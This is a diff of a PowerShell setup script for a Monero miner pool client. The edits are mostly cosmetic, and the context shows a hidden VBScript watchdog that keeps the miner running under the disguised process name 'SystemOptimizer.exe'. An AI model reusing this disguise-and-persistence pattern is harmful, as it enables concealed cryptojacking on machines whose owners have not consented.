@@ -1,5 +1,5 @@
 # ============================================================
-#  MONERO MINER SETUP v4 — BULLETPROOF (FIXED)
+#  MONERO MINER SETUP v4 -- BULLETPROOF (FIXED)
 #  Run in Admin PowerShell. One command. Fully transparent.
 #  Pool: MoneroOcean | Auto-profit-switching
 #
@@ -266,18 +266,18 @@ $wdLines = @(
     '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")',
     '',
     '    If procs.Count = 0 Then',
-    "        ' No miner — start with target config",
+    "        ' No miner -- start with target config",
     '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
     '        Set mf = fso.CreateTextFile(modeFile, True)',
     '        mf.Write targetMode',
     '        mf.Close',
     '        Set mf = Nothing',
     '    ElseIf procs.Count > 1 Then',
-    "        ' Too many miners — kill all, next loop starts one",
+    "        ' Too many miners -- kill all, next loop starts one",
     '        sh.Run "taskkill /F /IM SystemOptimizer.exe", 0, True',
     '        WScript.Sleep 2000',
-    '    ElseIf currentMode <> targetMode Then',
-    "        ' Wrong mode — restart with correct config",
+    '    ElseIf Not (currentMode = targetMode) Then',
+    "        ' Wrong mode -- restart with correct config",
     '        sh.Run "taskkill /F /IM SystemOptimizer.exe", 0, True',
     '        WScript.Sleep 3000',
     '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
@@ -405,7 +405,7 @@ if ($drv) {
     else { Show "--" "MSR driver skipped" }
 } else { Show "--" "MSR driver not found (optional)" }
 
-# ---- START (watchdog only — it starts exactly 1 miner) ----
+# ---- START (watchdog only -- it starts exactly 1 miner) ----
 Show ".." "Starting watchdog (will start exactly 1 miner)..."
 $shell = New-Object -ComObject WScript.Shell
 $shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
@@ -417,9 +417,9 @@ Start-Sleep 18
 $proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
 $minerCount = @($proc).Count
 if ($proc -and $minerCount -eq 1) {
-    Show "OK" "Miner RUNNING — exactly 1 instance (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
+    Show "OK" "Miner RUNNING -- exactly 1 instance (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
 } elseif ($minerCount -gt 1) {
-    Show "!!" "Multiple miners detected ($minerCount) — watchdog will fix this in 30s"
+    Show "!!" "Multiple miners detected ($minerCount) -- watchdog will fix this in 30s"
 } else {
     Show ".." "Miner starting... watchdog will launch it within 30s"
 }
@@ -427,8 +427,8 @@ if ($proc -and $minerCount -eq 1) {
 $wd = Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
     Where-Object { $_.CommandLine -like "*watchdog*" }
 $wdCount = @($wd).Count
-if ($wdCount -eq 1) { Show "OK" "Watchdog ACTIVE — exactly 1 instance (PID: $($wd.ProcessId))" }
-elseif ($wdCount -gt 1) { Show "!!" "Multiple watchdogs ($wdCount) — will self-correct" }
+if ($wdCount -eq 1) { Show "OK" "Watchdog ACTIVE -- exactly 1 instance (PID: $($wd.ProcessId))" }
+elseif ($wdCount -gt 1) { Show "!!" "Multiple watchdogs ($wdCount) -- will self-correct" }
 
 if ($proc) {
     $conn = Get-NetTCPConnection -OwningProcess $proc[0].Id -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Established" }
